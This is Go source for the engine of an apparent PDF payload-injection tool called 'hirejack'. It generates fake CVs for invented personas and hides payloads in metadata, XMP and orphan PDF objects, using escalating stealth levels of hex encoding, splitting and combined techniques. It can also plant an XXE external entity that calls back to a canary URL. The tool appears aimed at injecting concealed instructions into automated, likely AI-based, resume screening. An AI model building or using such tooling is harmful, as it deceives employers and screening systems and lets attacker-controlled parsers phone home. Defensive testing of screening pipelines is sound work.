// Package engine orchestrates payload injection into PDFs.
package engine

import (
	"fmt"

	"github.com/rs/zerolog/log"
	"hirejack/internal/canary"
	"hirejack/internal/encoders"
	"hirejack/internal/generators"
	"hirejack/internal/injectors"
	"hirejack/internal/payloads"
	"hirejack/internal/pdf"
)

// StealthLevel defines how hidden payloads are.
type StealthLevel int

const (
	StealthNone   StealthLevel = 0 // Raw payloads
	StealthBasic  StealthLevel = 1 // Metadata only
	StealthHex    StealthLevel = 2 // Hex encoding
	StealthSplit  StealthLevel = 3 // Split across locations
	StealthOrphan StealthLevel = 4 // Orphan objects
	StealthMax    StealthLevel = 5 // All techniques combined
)

// Engine orchestrates payload injection.
type Engine struct {
	canaryStore *canary.Store
	canaryURL   string
	stealth     StealthLevel

	metaInjector   *injectors.MetadataInjector
	xmpInjector    *injectors.XMPInjector
	orphanInjector *injectors.OrphanInjector
	hexEncoder     *encoders.HexEncoder
	splitEncoder   *encoders.SplitEncoder
	personaGen     *generators.PersonaGenerator
	cvGen          *generators.CVGenerator
	payloadGen     *payloads.Generator
}

// New creates a new engine.
func New(canaryURL string) *Engine {
	return &Engine{
		canaryStore:    canary.NewStore(),
		canaryURL:      canaryURL,
		stealth:        StealthBasic,
		metaInjector:   injectors.NewMetadataInjector(),
		xmpInjector:    injectors.NewXMPInjector(),
		orphanInjector: injectors.NewOrphanInjector(),
		hexEncoder:     encoders.NewHexEncoder(),
		splitEncoder:   encoders.NewSplitEncoder(),
		personaGen:     generators.NewPersonaGenerator(),
		cvGen:          generators.NewCVGenerator(nil),
		payloadGen:     payloads.NewGenerator(0), // seed 0 = time-based
	}
}

// SetStealth sets the stealth level.
func (e *Engine) SetStealth(level StealthLevel) {
	e.stealth = level
}

// InjectRequest specifies what to inject.
type InjectRequest struct {
	PDF         []byte            `json:"pdf"`          // Source PDF
	PayloadIDs  []string          `json:"payload_ids"`  // From registry
	ProfileID   string            `json:"profile_id"`   // Or use a profile
	CustomData  map[string]string `json:"custom_data"`  // Custom fields
	Stealth     StealthLevel      `json:"stealth"`      // Override stealth
	Fast        bool              `json:"fast"`         // Skip compression for speed
	AddCanary   bool              `json:"add_canary"`   // Add canary token
	CanaryLabel string            `json:"canary_label"` // Label for canary
	CanaryURL   string            `json:"canary_url"`   // Custom callback URL (overrides default)
}

// InjectResult contains the modified PDF and metadata.
type InjectResult struct {
	PDF         []byte           `json:"pdf"`
	Injections  []InjectionPoint `json:"injections"`
	CanaryToken *canary.Token    `json:"canary_token,omitempty"`
}

// InjectionPoint describes where a payload was injected.
type InjectionPoint struct {
	Location string `json:"location"` // metadata, xmp, orphan
	Field    string `json:"field"`    // author, dc:creator, etc
	Payload  string `json:"payload"`  // What was injected
	Encoded  bool   `json:"encoded"`  // Was it encoded
}

// Inject applies payloads to a PDF.
func (e *Engine) Inject(req InjectRequest) (*InjectResult, error) {
	// Reset orphan buffer from any previous run
	pdf.ResetOrphanBuffer()

	log.Debug().
		Int("pdf_kb", len(req.PDF)/1024).
		Int("payloads", len(req.PayloadIDs)).
		Str("profile", req.ProfileID).
		Int("stealth", int(req.Stealth)).
		Bool("fast", req.Fast).
		Msg("engine: inject start")

	doc, err := pdf.Parse(req.PDF)
	if err != nil {
		log.Debug().Err(err).Msg("engine: pdf parse failed")
		return nil, fmt.Errorf("engine: parse: %w", err)
	}

	stealth := req.Stealth
	if stealth == 0 {
		stealth = e.stealth
	}

	result := &InjectResult{
		Injections: []InjectionPoint{},
	}

	// Get payloads
	payloadList := e.resolvePayloads(req)
	log.Debug().Int("resolved", len(payloadList)).Msg("engine: payloads resolved")

	// Inject based on stealth level
	stealthName := map[StealthLevel]string{
		StealthBasic: "L1-basic", StealthHex: "L2-hex", StealthSplit: "L3-split",
		StealthOrphan: "L4-orphan", StealthMax: "L5-max",
	}[stealth]
	log.Debug().Str("mode", stealthName).Bool("fast", req.Fast).Msg("engine: injecting")

	switch {
	case stealth >= StealthMax:
		e.injectMax(doc, payloadList, result, req.Fast)
	case stealth >= StealthOrphan:
		e.injectOrphan(doc, payloadList, result, req.Fast)
	case stealth >= StealthSplit:
		e.injectSplit(doc, payloadList, result)
	case stealth >= StealthHex:
		e.injectHex(doc, payloadList, result, req.Fast)
	default:
		e.injectBasic(doc, payloadList, result)
	}

	// Add canary if requested
	if req.AddCanary {
		// Use custom canary URL if provided, otherwise use default
		canaryURL := e.canaryURL
		if req.CanaryURL != "" {
			canaryURL = req.CanaryURL
		}
		token := e.canaryStore.Generate(canaryURL, req.CanaryLabel)
		e.xmpInjector.InjectXXE(doc,
			fmt.Sprintf(`<!ENTITY canary SYSTEM "%s">`, token.CallbackURL),
			"dc:creator",
		)
		result.CanaryToken = token
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "xmp",
			Field:    "doctype",
			Payload:  "canary XXE",
		})
	}

	// Custom data
	if len(req.CustomData) > 0 {
		e.metaInjector.InjectMap(doc, req.CustomData)
		for k, v := range req.CustomData {
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    k,
				Payload:  v,
			})
		}
	}

	// Use orphan-preserving write for L4/L5
	if stealth >= StealthOrphan {
		orphanCount := pdf.GetOrphanCount()
		result.PDF, err = doc.BytesWithOrphans()
		log.Debug().Int("orphans", orphanCount).Msg("engine: appended orphan streams")
	} else {
		result.PDF, err = doc.Bytes()
	}
	if err != nil {
		log.Debug().Err(err).Msg("engine: pdf write failed")
		return nil, fmt.Errorf("engine: write: %w", err)
	}

	log.Debug().
		Int("injections", len(result.Injections)).
		Int("output_size", len(result.PDF)).
		Bool("has_canary", result.CanaryToken != nil).
		Msg("engine: inject complete")

	return result, nil
}

// GenerateCV creates a new CV with payloads.
func (e *Engine) GenerateCV(payloadIDs []string, stealth StealthLevel) (*InjectResult, error) {
	persona := e.personaGen.Generate()
	doc, err := e.cvGen.GenerateWithContent(persona)
	if err != nil {
		return nil, fmt.Errorf("engine: gen cv: %w", err)
	}

	pdfBytes, err := doc.Bytes()
	if err != nil {
		return nil, err
	}

	return e.Inject(InjectRequest{
		PDF:        pdfBytes,
		PayloadIDs: payloadIDs,
		Stealth:    stealth,
	})
}

// CanaryStore returns the canary token store.
func (e *Engine) CanaryStore() *canary.Store {
	return e.canaryStore
}

func (e *Engine) resolvePayloads(req InjectRequest) []payloads.Payload {
	var list []payloads.Payload
	var notFound []string

	if req.ProfileID != "" {
		if profile := payloads.GetProfile(req.ProfileID); profile != nil {
			for _, id := range profile {
				if p := payloads.GetPayload(id); p != nil {
					list = append(list, *p)
				} else {
					notFound = append(notFound, id)
				}
			}
			log.Debug().Str("profile", req.ProfileID).Int("loaded", len(list)).Msg("engine: profile loaded")
		} else {
			log.Debug().Str("profile", req.ProfileID).Msg("engine: profile not found")
		}
	}

	for _, id := range req.PayloadIDs {
		if p := payloads.GetPayload(id); p != nil {
			list = append(list, *p)
		} else {
			notFound = append(notFound, id)
		}
	}

	if len(notFound) > 0 {
		log.Debug().Int("count", len(notFound)).Strs("ids", notFound[:min(5, len(notFound))]).Msg("engine: payloads not found")
	}

	// Fill empty templates with generated content
	generated := 0
	withTemplate := 0
	for i := range list {
		if list[i].Template != "" {
			withTemplate++
			continue
		}
		catID := ""
		for _, cat := range payloads.Registry {
			for _, p := range cat.Payloads {
				if p.ID == list[i].ID {
					catID = cat.ID
					break
				}
			}
		}
		if catID != "" {
			list[i].Template = e.payloadGen.FillTemplate(catID + "." + list[i].ID)
			if list[i].Template != "" {
				generated++
			}
		}
	}

	log.Debug().
		Int("total", len(list)).
		Int("with_template", withTemplate).
		Int("generated", generated).
		Msg("engine: payloads resolved")

	return list
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (e *Engine) injectBasic(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	// Group payloads by target field, concatenate with separator
	fields := []string{"Author", "Subject", "Keywords", "Creator", "Producer"}
	buckets := make(map[string][]string)

	skipped := 0
	for i, p := range plist {
		if p.Template == "" {
			skipped++
			continue
		}
		field := fields[i%len(fields)]
		buckets[field] = append(buckets[field], p.Template)
	}
	if skipped > 0 {
		log.Debug().Int("skipped", skipped).Msg("engine: payloads with empty templates")
	}

	// Inject concatenated payloads
	for _, field := range fields {
		if payloads, ok := buckets[field]; ok && len(payloads) > 0 {
			combined := ""
			for i, p := range payloads {
				if i > 0 {
					combined += " | "
				}
				combined += p
			}
			e.metaInjector.InjectField(doc, field, combined)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    field,
				Payload:  combined,
			})
		}
	}
}

func (e *Engine) injectHex(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult, fast bool) {
	fields := []string{"Author", "Subject", "Keywords", "Creator", "Producer"}

	for i, p := range plist {
		if p.Template == "" {
			continue
		}
		encoded := e.hexEncoder.Encode(p.Template)
		if i >= len(fields) {
			if fast {
				doc.CreateOrphanStreamRaw([]byte(encoded))
			} else {
				doc.CreateOrphanStream([]byte(encoded))
			}
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "orphan",
				Payload:  p.Template,
				Encoded:  true,
			})
		} else {
			field := fields[i%len(fields)]
			e.metaInjector.InjectField(doc, field, encoded)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    field,
				Payload:  p.Template,
				Encoded:  true,
			})
		}
	}
}

func (e *Engine) injectSplit(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	// Split mode: first 6 payloads get split across metadata fields,
	// rest go to orphan streams
	fields := []string{"Author", "Title", "Subject", "Keywords", "Creator", "Producer"}

	for i, p := range plist {
		if p.Template == "" {
			continue
		}
		if i < len(fields) {
			sr, _ := e.splitEncoder.SplitString(p.Template)
			for j, frag := range sr.Fragments {
				if j >= len(fields) {
					break
				}
				e.metaInjector.InjectField(doc, fields[j], string(frag.Content))
				result.Injections = append(result.Injections, InjectionPoint{
					Location: "metadata",
					Field:    fields[j],
					Payload:  string(frag.Content),
					Encoded:  true,
				})
			}
		} else {
			doc.CreateOrphanStream([]byte(p.Template))
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "orphan",
				Payload:  p.Template,
			})
		}
	}
}

func (e *Engine) injectOrphan(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult, fast bool) {
	for _, p := range plist {
		if p.Template == "" {
			continue
		}
		if fast {
			doc.CreateOrphanStreamRaw([]byte(p.Template))
		} else {
			doc.CreateOrphanStream([]byte(p.Template))
		}
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "orphan",
			Payload:  p.Template,
		})
	}
}

func (e *Engine) injectMax(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult, fast bool) {
	// Max stealth: distribute payloads across techniques
	// Bucket by location type, then inject combined
	metaFields := []string{"Author", "Subject", "Keywords", "Creator", "Producer"}
	metaBuckets := make(map[string][]string)
	var xmpPayloads, orphanPayloads []string

	skipped := 0
	for i, p := range plist {
		if p.Template == "" {
			skipped++
			continue
		}

		// Round-robin across techniques
		switch i % 3 {
		case 0: // metadata
			field := metaFields[i%len(metaFields)]
			metaBuckets[field] = append(metaBuckets[field], p.Template)
		case 1: // xmp
			xmpPayloads = append(xmpPayloads, p.Template)
		case 2: // orphan
			orphanPayloads = append(orphanPayloads, p.Template)
		}
	}

	if skipped > 0 {
		log.Debug().Int("skipped", skipped).Msg("engine: empty templates")
	}

	// Inject metadata (hex encoded, concatenated)
	for _, field := range metaFields {
		if payloads, ok := metaBuckets[field]; ok && len(payloads) > 0 {
			combined := ""
			for i, p := range payloads {
				if i > 0 {
					combined += " "
				}
				combined += p
			}
			encoded := e.hexEncoder.Encode(combined)
			e.metaInjector.InjectField(doc, field, encoded)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata", Field: field, Payload: combined, Encoded: true,
			})
		}
	}

	// Inject XMP (concatenated into creator field)
	if len(xmpPayloads) > 0 {
		combined := ""
		for i, p := range xmpPayloads {
			if i > 0 {
				combined += " | "
			}
			combined += p
		}
		e.xmpInjector.Inject(doc, injectors.XMPConfig{Creator: combined})
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "xmp", Field: "dc:creator", Payload: combined,
		})
	}

	// Inject orphan streams (one per payload for max coverage)
	for _, p := range orphanPayloads {
		if fast {
			doc.CreateOrphanStreamRaw([]byte(p))
		} else {
			doc.CreateOrphanStream([]byte(p))
		}
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "orphan", Payload: p,
		})
	}
}
